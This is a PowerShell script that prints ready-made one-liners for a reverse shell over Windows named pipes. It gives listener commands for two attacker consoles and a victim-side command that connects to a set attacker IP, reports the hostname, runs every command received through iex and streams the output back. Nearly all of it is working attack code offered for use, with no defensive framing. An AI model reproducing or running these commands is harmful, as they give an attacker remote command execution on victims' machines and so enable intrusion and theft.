$dataChannel = "fuego-data"
$controlChannel = "fuego-control"
$myC2ipAdress = "192.168.49.116"
$shellprompt = "fuegoShell-reverse>"
$cmdlogmsg = "[cmdlog]> "


Write-Host "
Hello,
Here are the oneliners for reverse shell using rpc named pipes. Enjoy ! 
#
### INFOS ###
#
Named pipe for the data channel : $dataChannel
Named pipe for the ctrl channel : $controlChannel
My attacker IP address : $myC2ipAdress
My custom shell prompt : $shellprompt
My custom log message : $cmdlogmsg
#
### attacker side : open two powershell consoles ###
#
# In the powershell console 1 run : 

`$host.ui.RawUI.WindowTitle = `"DATA-CHANNEL`";`$pipedata = new-object System.IO.Pipes.NamedPipeServerStream '$dataChannel','In'; `$pipedata.WaitForConnection();`$sr= new-object System.IO.StreamReader `$pipedata; while ((`$data = `$sr.ReadLine()) -ne `$null) { echo `$data.ToString()};`$sr.Dispose();`$pipedata.Dispose();

# In the powershell console 2 run : 

`$host.ui.RawUI.WindowTitle = `"CONTROL-CHANNEL`";`$pipecontrol = new-object System.IO.Pipes.NamedPipeServerStream '$controlChannel','Out'; `$pipecontrol.WaitForConnection(); `$sw = new-object System.IO.StreamWriter `$pipecontrol; `$sw.AutoFlush = `$true;`$myprompt = '$shellprompt';do { `$mycmd = Read-Host -Prompt `$myprompt; `$sw.WriteLine(`$mycmd) } until (`$mycmd -eq 'exit');`$sw.Dispose();`$pipecontrol.Dispose();

#
### victim side : open one powershell console ###
#
# In the powershell console : 

`$pipedata = new-object System.IO.Pipes.NamedPipeClientStream '$myC2ipAdress','$dataChannel','Out';`$pipedata.Connect();`$sw = new-object System.IO.StreamWriter `$pipedata; `$sw.AutoFlush = `$true;`$currentHost = iex 'hostname' | Out-String;`$sw.WriteLine(`"-------------------------`");`$sw.WriteLine(`"[+] New incoming shell from : `");`$sw.WriteLine(`$currentHost);`$sw.WriteLine(`"---`");`$pipeListener = new-object System.IO.Pipes.NamedPipeClientStream '$myC2ipAdress','$controlChannel','In'; `$pipeListener.Connect(); `$sr= new-object System.IO.StreamReader `$pipeListener;`$mylogmsg = '$cmdlogmsg'; while ((`$data = `$sr.ReadLine()) -ne 'exit') {`$currentDate = Get-Date -Format `"yyyyMMdd_HHmmss`" ; `$res = iex `$data | Out-String ; `$sw.WriteLine(`$currentDate+`$mylogmsg+`$data); `$sw.WriteLine(`$res)};`$sw.Dispose();`$pipeListener.Dispose();`$sr.Dispose();`$pipedata.Dispose();

"

